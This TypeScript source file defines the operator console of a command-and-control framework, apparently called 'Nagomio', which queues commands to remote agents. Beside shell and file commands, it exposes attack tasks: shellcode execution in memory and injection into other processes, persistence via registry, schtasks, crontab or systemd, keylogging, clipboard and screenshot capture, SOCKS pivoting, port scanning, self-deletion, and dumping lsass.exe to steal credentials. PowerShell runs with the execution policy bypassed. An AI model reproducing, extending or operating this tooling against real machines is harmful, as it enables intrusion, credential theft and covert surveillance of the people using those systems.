import { AgentPlatform, QueuedCommand } from "./commandCatalog";

export type ConsoleCommandResult =
  | { type: "queue"; label: string; task: QueuedCommand }
  | { type: "local"; output: string }
  | { type: "clear" }
  | { type: "switch"; tab: "console" | "files"; output?: string }
  | { type: "upload"; remotePath: string };

type ConsoleCommand = {
  name: string;
  aliases?: string[];
  usage: string;
  summary: string;
  run: (args: string[], platform: AgentPlatform) => ConsoleCommandResult;
};

function shQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function psQuote(value: string): string {
  return `'${value.replace(/'/g, "''")}'`;
}

function runShell(script: string, platform: AgentPlatform): QueuedCommand {
  if (platform === "windows") {
    return {
      command: "powershell.exe",
      arguments: ["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
      preview: script
    };
  }

  return {
    command: "sh",
    arguments: ["-lc", script],
    preview: script
  };
}

function tokenize(input: string): string[] {
  const tokens: string[] = [];
  let current = "";
  let quote: '"' | "'" | null = null;

  for (const ch of input.trim()) {
    if (quote) {
      if (ch === quote) quote = null;
      else current += ch;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (/\s/.test(ch)) {
      if (current) {
        tokens.push(current);
        current = "";
      }
      continue;
    }
    current += ch;
  }

  if (current) tokens.push(current);
  return tokens;
}

function requireArgs(args: string[], count: number, usage: string): string | null {
  return args.length >= count ? null : `usage: ${usage}`;
}

export const consoleCommands: ConsoleCommand[] = [
  {
    name: "help",
    usage: "help [command]",
    summary: "Show available commands or command-specific usage.",
    run: (args) => ({ type: "local", output: helpText(args[0]) })
  },
  {
    name: "clear",
    aliases: ["cls"],
    usage: "clear",
    summary: "Clear the local console view.",
    run: () => ({ type: "clear" })
  },
  {
    name: "files",
    aliases: ["file-explorer", "explorer"],
    usage: "files",
    summary: "Switch the bottom session pane to File Explorer.",
    run: () => ({ type: "switch", tab: "files", output: "switched to file explorer" })
  },
  {
    name: "console",
    usage: "console",
    summary: "Switch the bottom session pane to Console.",
    run: () => ({ type: "switch", tab: "console" })
  },
  {
    name: "shell",
    usage: "shell <command line>",
    summary: "Run a raw shell command using sh on Linux or PowerShell on Windows.",
    run: (args, platform) => {
      const error = requireArgs(args, 1, "shell <command line>");
      if (error) return { type: "local", output: error };
      const script = args.join(" ");
      return { type: "queue", label: "shell", task: runShell(script, platform) };
    }
  },
  {
    name: "powershell",
    aliases: ["psh"],
    usage: "powershell <command line>",
    summary: "Run a PowerShell command on a Windows agent.",
    run: (args) => {
      const error = requireArgs(args, 1, "powershell <command line>");
      if (error) return { type: "local", output: error };
      const script = args.join(" ");
      return {
        type: "queue",
        label: "powershell",
        task: {
          command: "powershell.exe",
          arguments: ["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script],
          preview: script
        }
      };
    }
  },
  {
    name: "sysinfo",
    usage: "sysinfo",
    summary: "Collect user, host, OS, and architecture information.",
    run: (_, platform) => ({
      type: "queue",
      label: "sysinfo",
      task: runShell(
        platform === "windows"
          ? "whoami; hostname; $PSVersionTable.OS; Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,OSArchitecture | Format-List"
          : "whoami; hostname; uname -a; id",
        platform
      )
    })
  },
  {
    name: "ls",
    aliases: ["dir"],
    usage: "ls [path]",
    summary: "List files through the agent file API.",
    run: (args) => ({
      type: "queue",
      label: "ls",
      task: { command: "file_list", arguments: [args[0] || "."], preview: `ls ${args[0] || "."}` }
    })
  },
  {
    name: "cat",
    aliases: ["type"],
    usage: "cat <path>",
    summary: "Print a remote text file.",
    run: (args, platform) => {
      const error = requireArgs(args, 1, "cat <path>");
      if (error) return { type: "local", output: error };
      const path = args[0];
      return {
        type: "queue",
        label: "cat",
        task: runShell(platform === "windows" ? `Get-Content -Raw -LiteralPath ${psQuote(path)}` : `cat -- ${shQuote(path)}`, platform)
      };
    }
  },
  {
    name: "download",
    usage: "download <remote-path>",
    summary: "Download a remote file into teamserver download storage.",
    run: (args) => {
      const error = requireArgs(args, 1, "download <remote-path>");
      if (error) return { type: "local", output: error };
      return {
        type: "queue",
        label: "download",
        task: { command: "file_download", arguments: [args[0]], preview: `download ${args[0]}` }
      };
    }
  },
  {
    name: "upload",
    usage: "upload <remote-destination>",
    summary: "Open a local file picker and upload the selected file to the remote path.",
    run: (args) => {
      const error = requireArgs(args, 1, "upload <remote-destination>");
      if (error) return { type: "local", output: error };
      return { type: "upload", remotePath: args[0] };
    }
  },
  {
    name: "rm",
    aliases: ["del"],
    usage: "rm <remote-path>",
    summary: "Delete a remote file or directory.",
    run: (args) => {
      const error = requireArgs(args, 1, "rm <remote-path>");
      if (error) return { type: "local", output: error };
      return { type: "queue", label: "rm", task: { command: "file_delete", arguments: [args[0]], preview: `rm ${args[0]}` } };
    }
  },
  {
    name: "mv",
    aliases: ["rename"],
    usage: "mv <source> <destination>",
    summary: "Rename or move a remote file.",
    run: (args) => {
      const error = requireArgs(args, 2, "mv <source> <destination>");
      if (error) return { type: "local", output: error };
      return { type: "queue", label: "mv", task: { command: "file_rename", arguments: [args[0], args[1]], preview: `mv ${args[0]} ${args[1]}` } };
    }
  },
  {
    name: "mkdir",
    usage: "mkdir <remote-path>",
    summary: "Create a remote directory.",
    run: (args) => {
      const error = requireArgs(args, 1, "mkdir <remote-path>");
      if (error) return { type: "local", output: error };
      return { type: "queue", label: "mkdir", task: { command: "file_mkdir", arguments: [args[0]], preview: `mkdir ${args[0]}` } };
    }
  },
  {
    name: "ps",
    usage: "ps",
    summary: "List running processes.",
    run: (_, platform) => ({
      type: "queue",
      label: "ps",
      task: runShell(platform === "windows" ? "Get-Process | Sort-Object ProcessName | Select-Object ProcessName,Id,CPU,WorkingSet | Format-Table -AutoSize" : "ps aux", platform)
    })
  },
  {
    name: "kill",
    usage: "kill <pid>",
    summary: "Terminate a process by PID.",
    run: (args, platform) => {
      const error = requireArgs(args, 1, "kill <pid>");
      if (error) return { type: "local", output: error };
      return { type: "queue", label: "kill", task: runShell(platform === "windows" ? `Stop-Process -Id ${args[0]} -Force` : `kill -9 ${shQuote(args[0])}`, platform) };
    }
  },
  {
    name: "net",
    usage: "net",
    summary: "Show interface and route information.",
    run: (_, platform) => ({
      type: "queue",
      label: "net",
      task: runShell(platform === "windows" ? "ipconfig /all; route print" : "ip addr; ip route", platform)
    })
  },
  {
    name: "whoami",
    usage: "whoami",
    summary: "Return username, integrity level, and elevation status as JSON.",
    run: () => ({ type: "queue", label: "whoami", task: { command: "whoami", arguments: [], preview: "whoami" } })
  },
  {
    name: "mem_exec",
    usage: "mem_exec <base64-shellcode>",
    summary: "Allocate memory, copy shellcode in, and run it on a new thread.",
    run: (args) => {
      const error = requireArgs(args, 1, "mem_exec <base64-shellcode>");
      if (error) return { type: "local", output: error };
      const sc = args[0];
      return {
        type: "queue",
        label: "mem_exec",
        task: { command: "mem_exec", arguments: [sc], preview: `mem_exec ${sc.slice(0, 24)}…` }
      };
    }
  },
  {
    name: "portscan",
    usage: "portscan <host> <ports> [timeout-ms]",
    summary: "Quick TCP-connect scan of a host with a port list (e.g. 22,80,8000-8100).",
    run: (args) => {
      const error = requireArgs(args, 2, "portscan <host> <ports> [timeout-ms]");
      if (error) return { type: "local", output: error };
      const host = args[0];
      const ports = args[1];
      const timeout = args[2] || "200";
      return {
        type: "queue",
        label: "portscan",
        task: { command: "portscan", arguments: [host, ports, timeout], preview: `portscan ${host} ${ports}` }
      };
    }
  },
  {
    name: "persist",
    usage: "persist <strategy> [binary-path]",
    summary: "Install a persistence mechanism (registry/schtasks on Windows, crontab/systemd-user/shell-profile on Linux).",
    run: (args) => {
      const error = requireArgs(args, 1, "persist <strategy> [binary-path]");
      if (error) return { type: "local", output: error };
      const strategy = args[0];
      const bin = args[1];
      const taskArgs = bin ? [strategy, bin] : [strategy];
      return {
        type: "queue",
        label: "persist",
        task: { command: "persist", arguments: taskArgs, preview: `persist ${taskArgs.join(" ")}` }
      };
    }
  },
  {
    name: "uninstall",
    usage: "uninstall <now|reboot>",
    summary: "Self-delete the agent binary. now = immediate; reboot = schedule for next boot.",
    run: (args) => {
      const error = requireArgs(args, 1, "uninstall <now|reboot>");
      if (error) return { type: "local", output: error };
      return {
        type: "queue",
        label: "uninstall",
        task: { command: "uninstall", arguments: [args[0]], preview: `uninstall ${args[0]}` }
      };
    }
  },
  {
    name: "socks",
    usage: "socks <open|write|close> <target|cid> [data-b64]",
    summary: "SOCKS5 pivot relay. open host:port [cid] / write cid b64data / close cid.",
    run: (args) => {
      const error = requireArgs(args, 2, "socks <open|write|close> <target|cid> [data-b64]");
      if (error) return { type: "local", output: error };
      const op = args[0];
      const taskArgs = [op, args[1], ...args.slice(2)];
      return {
        type: "queue",
        label: `socks ${op}`,
        task: { command: "socks", arguments: taskArgs, preview: `socks ${taskArgs.join(" ")}` }
      };
    }
  },
  {
    name: "screenshot",
    usage: "screenshot",
    summary: "Capture the primary display and return it as a base64 BMP (Windows only).",
    run: () => ({ type: "queue", label: "screenshot", task: { command: "screenshot", arguments: [], preview: "screenshot" } })
  },
  {
    name: "clipboard",
    usage: "clipboard",
    summary: "Read the current Windows clipboard text (Windows only).",
    run: () => ({ type: "queue", label: "clipboard", task: { command: "clipboard", arguments: [], preview: "clipboard" } })
  },
  {
    name: "keylog",
    usage: "keylog <start|flush>",
    summary: "Start a low-level keyboard hook or flush captured keystrokes (Windows only).",
    run: (args) => {
      const error = requireArgs(args, 1, "keylog <start|flush>");
      if (error) return { type: "local", output: error };
      return {
        type: "queue",
        label: "keylog",
        task: { command: "keylog", arguments: [args[0]], preview: `keylog ${args[0]}` }
      };
    }
  },
  {
    name: "inject",
    usage: "inject <pid> <base64-shellcode> [thread|hijack]",
    summary: "Inject shellcode into a remote process via a new thread or hijack (Windows only).",
    run: (args) => {
      const error = requireArgs(args, 2, "inject <pid> <base64-shellcode> [thread|hijack]");
      if (error) return { type: "local", output: error };
      const pid = args[0];
      const sc = args[1];
      const mode = args[2] || "thread";
      return {
        type: "queue",
        label: "inject",
        task: { command: "inject", arguments: [pid, sc, mode], preview: `inject ${pid} ${sc.slice(0, 24)}…` }
      };
    }
  },
  {
    name: "lsass",
    usage: "lsass",
    summary: "MiniDumpWriteDump lsass.exe and return the bytes (Windows only).",
    run: () => ({ type: "queue", label: "lsass", task: { command: "lsass", arguments: [], preview: "lsass" } })
  }
];

export function parseConsoleCommand(input: string, platform: AgentPlatform): ConsoleCommandResult {
  const tokens = tokenize(input);
  if (tokens.length === 0) {
    return { type: "local", output: "" };
  }

  const [name, ...args] = tokens;
  const command = consoleCommands.find((item) => item.name === name || item.aliases?.includes(name));
  if (command) {
    return command.run(args, platform);
  }

  return { type: "queue", label: name, task: runShell(input, platform) };
}

export function helpText(commandName?: string): string {
  if (commandName) {
    const command = consoleCommands.find((item) => item.name === commandName || item.aliases?.includes(commandName));
    if (!command) return `unknown command: ${commandName}\n\n${helpText()}`;
    const aliases = command.aliases?.length ? `\naliases: ${command.aliases.join(", ")}` : "";
    return `${command.name}\nusage: ${command.usage}${aliases}\n${command.summary}`;
  }

  return [
    "Nagomio console commands:",
    ...consoleCommands.map((command) => `  ${command.usage.padEnd(32)} ${command.summary}`),
    "",
    "Unknown commands are executed as raw shell on the selected agent.",
    "Use quotes for paths or arguments containing spaces."
  ].join("\n");
}
